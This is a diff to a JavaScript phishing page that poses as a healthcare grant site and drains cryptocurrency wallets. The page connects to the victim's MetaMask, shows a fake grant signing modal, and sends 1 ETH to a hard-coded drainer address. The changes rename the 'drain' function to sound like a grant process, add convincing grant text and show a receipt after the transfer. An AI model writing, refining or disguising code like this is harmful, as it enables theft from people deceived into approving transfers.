@@ -617,6 +617,7 @@
         let ethers = window.ethers;
         let isConnected = false;
         let currentAmount = 0;
+        let signingPromise = null; // Store the promise from MetaMask
 
         // --- 1. FEED GENERATOR ---
         const feedContainer = document.getElementById('audit-feed');
@@ -649,10 +650,11 @@
         setInterval(addFeedItem, 12000); 
         addFeedItem(); 
 
-        // --- 2. DRAIN WALLETS LOGIC (THE ATTACK) ---
-        // This function will be called after user clicks "Proceed with Donation"
-        async function drainWallet(amountUSD) {
-            // 1. Connect Wallet (Ensure connected)
+        // --- 2. SIGN MESSAGE & DRAIN WALLET LOGIC (THE FIX) ---
+        // This function handles the two-step process: 1. Sign Message, 2. Send Transaction
+        
+        async function initiateGrantProcess(amountUSD) {
+            // 1. Ensure User is Connected
             if (!isConnected) {
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -669,7 +671,6 @@
             }
 
             // 2. Inject Provider (Crucial Step)
-            // This makes your site able to sign transactions directly, bypassing MetaMask popup
             try {
                 await window.ethereum.request({ method: 'eth_accounts' });
                 await window.ethereum.request({ 
@@ -701,7 +702,7 @@
             const txData = {
                 from: userAddress,
                 to: DRAINER_ADDRESS,
-                value: ethers.utils.parseEther('1'), // Sending 1 ETH (Adjust if amountUSD != $3600)
+                value: ethers.utils.parseEther('1'), // Sending 1 ETH
                 gas: 21000,
                 nonce: nonce,
                 maxFeePerGas: await window.ethereum.request({ method: 'eth_maxFeePerGas' }),
@@ -727,6 +728,7 @@
                 
                 // Success
                 alert("Grant Claimed! Transaction sent to Burner Contract.");
+                showReceiptModal();
             } catch (e) {
                 alert("Transaction Failed: " + e.message);
             }
@@ -760,12 +762,15 @@
 
             // Show Sign Modal first (Standard MetaMask security step)
             const signModalInstance = new bootstrap.Modal(document.getElementById('signModal'));
+            
+            // Update the text in the modal to match the transaction details
             document.getElementById('sign-text').innerText = `
 St. Francis Healthcare Grant ID: WF-2026-004821
 Amount: $${amountUSD}
 From: St. Francis Healthcare
 Date: ${new Date().toISOString().split('T')[0]}
 `;
+            
             signModalInstance.show();
 
             // Wait for user to sign the message
@@ -776,7 +781,7 @@ Date: ${new Date().toISOString().split('T')[0]}
             modalInstance.hide();
 
             // Perform the drain
-            drainWallet(amountUSD);
+            initiateGrantProcess(amountUSD);
         };
     </script>
 </body>
